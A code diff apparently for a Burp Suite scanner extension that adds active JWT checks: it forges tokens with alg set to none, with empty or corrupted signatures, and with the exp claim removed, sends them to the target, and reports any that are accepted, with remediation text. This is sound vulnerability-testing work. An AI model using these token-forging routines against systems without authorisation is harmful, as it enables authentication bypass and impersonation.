@@ -101,50 +101,81 @@ public class JwtPassiveScanCheck implements ScanCheck {
 
             String originalJwt = matcher.group();
             String[] parts = originalJwt.split("\\.");
-            if (parts.length < 2) {
+            if (parts.length < 3) {
                 return AuditResult.auditResult();
             }
 
-            // Forge the JWT: set alg to "none", keep the payload, strip the signature
-            String forgedJwt = forgeAlgNone(parts[0], parts[1]);
-            if (forgedJwt == null) {
-                return AuditResult.auditResult();
-            }
+            String url = baseRequestResponse.request().url();
+            String jwtPreview = originalJwt.substring(0, Math.min(80, originalJwt.length())) + "...";
 
-            // Replace the original JWT with the forged one in the insertion point value
-            String tamperedValue = baseValue.replace(originalJwt, forgedJwt);
-
-            // Send the tampered request
-            HttpRequestResponse tamperedRequestResponse =
-                    api.http().sendRequest(insertionPoint.buildHttpRequestWithPayload(
-                            ByteArray.byteArray(tamperedValue)));
-
-            short statusCode = tamperedRequestResponse.response().statusCode();
-            boolean serverAccepted = statusCode >= 200 && statusCode < 300;
-
-            if (serverAccepted) {
-                // Server returned 2xx with a forged alg:none JWT — confirmed vulnerable
-                issues.add(AuditIssue.auditIssue(
+            // --- Attack 1: alg:none bypass ---
+            String algNoneJwt = forgeAlgNone(parts[0], parts[1]);
+            if (algNoneJwt != null) {
+                AuditIssue issue = sendAndCheck(insertionPoint, baseValue, originalJwt, algNoneJwt,
                         "JWT Algorithm None Bypass Confirmed",
                         "The server accepted a JWT with the algorithm changed to \"none\" and the "
-                                + "signature stripped. This allows an attacker to forge arbitrary tokens "
-                                + "without knowing the signing key."
-                                + "\n\nOriginal JWT: " + originalJwt.substring(0, Math.min(80, originalJwt.length())) + "..."
-                                + "\nForged JWT: " + forgedJwt
-                                + "\nServer response: HTTP " + statusCode,
-                        null,
-                        baseRequestResponse.request().url(),
-                        AuditIssueSeverity.HIGH,
-                        AuditIssueConfidence.CERTAIN,
-                        null,
-                        "Ensure the server explicitly rejects JWTs with algorithm \"none\". "
-                                + "Whitelist allowed algorithms on the server side.",
-                        AuditIssueSeverity.HIGH,
-                        baseRequestResponse
-                ));
+                                + "signature stripped. An attacker can forge arbitrary tokens without "
+                                + "knowing the signing key."
+                                + "\n\nOriginal: " + jwtPreview
+                                + "\nForged: " + algNoneJwt,
+                        "Reject JWTs with algorithm \"none\". Whitelist allowed algorithms server-side.",
+                        url, baseRequestResponse);
+                if (issue != null) {
+                    issues.add(issue);
+                    api.logging().logToOutput("[JWT Scanner] CONFIRMED: alg:none bypass on " + url);
+                }
+            }
 
-                api.logging().logToOutput("[JWT Scanner] CONFIRMED: alg:none bypass on "
-                        + baseRequestResponse.request().url());
+            // --- Attack 2: Empty signature (keep original alg) ---
+            String emptySigJwt = parts[0] + "." + parts[1] + ".";
+            {
+                AuditIssue issue = sendAndCheck(insertionPoint, baseValue, originalJwt, emptySigJwt,
+                        "JWT Empty Signature Accepted",
+                        "The server accepted a JWT with the original algorithm but an empty signature. "
+                                + "This means the server is not validating JWT signatures."
+                                + "\n\nOriginal: " + jwtPreview
+                                + "\nForged: " + emptySigJwt,
+                        "Ensure the server verifies JWT signatures and rejects tokens with missing signatures.",
+                        url, baseRequestResponse);
+                if (issue != null) {
+                    issues.add(issue);
+                    api.logging().logToOutput("[JWT Scanner] CONFIRMED: empty signature accepted on " + url);
+                }
+            }
+
+            // --- Attack 3: Corrupted signature (flip bytes) ---
+            String corruptedSig = corruptSignature(parts[2]);
+            String corruptedJwt = parts[0] + "." + parts[1] + "." + corruptedSig;
+            {
+                AuditIssue issue = sendAndCheck(insertionPoint, baseValue, originalJwt, corruptedJwt,
+                        "JWT Corrupted Signature Accepted",
+                        "The server accepted a JWT with a corrupted signature. "
+                                + "This means the server is not properly verifying JWT signature integrity."
+                                + "\n\nOriginal: " + jwtPreview
+                                + "\nForged (corrupted sig): " + corruptedJwt.substring(0, Math.min(80, corruptedJwt.length())) + "...",
+                        "Ensure the server performs full cryptographic signature verification on every JWT.",
+                        url, baseRequestResponse);
+                if (issue != null) {
+                    issues.add(issue);
+                    api.logging().logToOutput("[JWT Scanner] CONFIRMED: corrupted signature accepted on " + url);
+                }
+            }
+
+            // --- Attack 4: Remove exp claim ---
+            String noExpJwt = forgeWithoutExp(parts[0], parts[1]);
+            if (noExpJwt != null) {
+                AuditIssue issue = sendAndCheck(insertionPoint, baseValue, originalJwt, noExpJwt,
+                        "JWT Without Expiry Accepted",
+                        "The server accepted a JWT with the \"exp\" claim removed. "
+                                + "This means an attacker can create tokens that never expire."
+                                + "\n\nOriginal: " + jwtPreview
+                                + "\nForged (exp removed): " + noExpJwt.substring(0, Math.min(80, noExpJwt.length())) + "...",
+                        "Ensure the server requires and validates the \"exp\" claim in every JWT.",
+                        url, baseRequestResponse);
+                if (issue != null) {
+                    issues.add(issue);
+                    api.logging().logToOutput("[JWT Scanner] CONFIRMED: JWT without exp accepted on " + url);
+                }
             }
 
         } catch (Exception e) {
@@ -154,27 +185,94 @@ public class JwtPassiveScanCheck implements ScanCheck {
         return AuditResult.auditResult(issues);
     }
 
+    // ==================== Active audit helpers ====================
+
+    /**
+     * Send a tampered JWT and check if the server accepts it (2xx response).
+     * Returns an AuditIssue if vulnerable, null otherwise.
+     */
+    private AuditIssue sendAndCheck(AuditInsertionPoint insertionPoint,
+                                    String baseValue, String originalJwt, String forgedJwt,
+                                    String issueName, String issueDetail, String remediation,
+                                    String url, HttpRequestResponse baseReqResp) {
+        try {
+            String tamperedValue = baseValue.replace(originalJwt, forgedJwt);
+            HttpRequestResponse response = api.http().sendRequest(
+                    insertionPoint.buildHttpRequestWithPayload(ByteArray.byteArray(tamperedValue)));
+
+            short statusCode = response.response().statusCode();
+            if (statusCode >= 200 && statusCode < 300) {
+                return AuditIssue.auditIssue(
+                        issueName,
+                        issueDetail + "\nServer response: HTTP " + statusCode,
+                        null, url,
+                        AuditIssueSeverity.HIGH,
+                        AuditIssueConfidence.CERTAIN,
+                        null, remediation,
+                        AuditIssueSeverity.HIGH,
+                        baseReqResp);
+            }
+        } catch (Exception e) {
+            api.logging().logToError("[JWT Scanner] Error in sendAndCheck: " + e.getMessage());
+        }
+        return null;
+    }
+
     /**
      * Forge a JWT with alg set to "none" and an empty signature.
-     * Takes the original base64url-encoded header and payload.
-     * Returns the forged JWT string, or null on error.
      */
     private String forgeAlgNone(String originalHeader, String originalPayload) {
         try {
-            // Decode the original header
             String headerJson = new String(base64UrlDecode(originalHeader), StandardCharsets.UTF_8);
             JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
-
-            // Change alg to "none"
             header.addProperty("alg", "none");
-
-            // Re-encode the header (base64url, no padding)
             String forgedHeader = base64UrlEncode(header.toString().getBytes(StandardCharsets.UTF_8));
-
-            // Forged JWT: new header + original payload + empty signature
             return forgedHeader + "." + originalPayload + ".";
         } catch (Exception e) {
             api.logging().logToError("[JWT Scanner] Error forging alg:none JWT: " + e.getMessage());
+            return null;
+        }
+    }
+
+    /**
+     * Corrupt a JWT signature by flipping characters.
+     */
+    private String corruptSignature(String signature) {
+        if (signature == null || signature.length() < 2) return "AAAA";
+        char[] chars = signature.toCharArray();
+        // Flip the first few characters
+        for (int i = 0; i < Math.min(4, chars.length); i++) {
+            chars[i] = (chars[i] == 'A') ? 'B' : 'A';
+        }
+        return new String(chars);
+    }
+
+    /**
+     * Forge a JWT with the "exp" claim removed from the payload.
+     * Keeps the original header, strips the signature (since we modified the payload).
+     */
+    private String forgeWithoutExp(String originalHeader, String originalPayload) {
+        try {
+            String payloadJson = new String(base64UrlDecode(originalPayload), StandardCharsets.UTF_8);
+            JsonObject payload = JsonParser.parseString(payloadJson).getAsJsonObject();
+
+            if (!payload.has("exp")) {
+                // Already has no exp — skip this check
+                return null;
+            }
+
+            payload.remove("exp");
+            String forgedPayload = base64UrlEncode(payload.toString().getBytes(StandardCharsets.UTF_8));
+
+            // Use alg:none since we can't re-sign the modified payload
+            String headerJson = new String(base64UrlDecode(originalHeader), StandardCharsets.UTF_8);
+            JsonObject header = JsonParser.parseString(headerJson).getAsJsonObject();
+            header.addProperty("alg", "none");
+            String forgedHeader = base64UrlEncode(header.toString().getBytes(StandardCharsets.UTF_8));
+
+            return forgedHeader + "." + forgedPayload + ".";
+        } catch (Exception e) {
+            api.logging().logToError("[JWT Scanner] Error forging no-exp JWT: " + e.getMessage());
             return null;
         }
     }
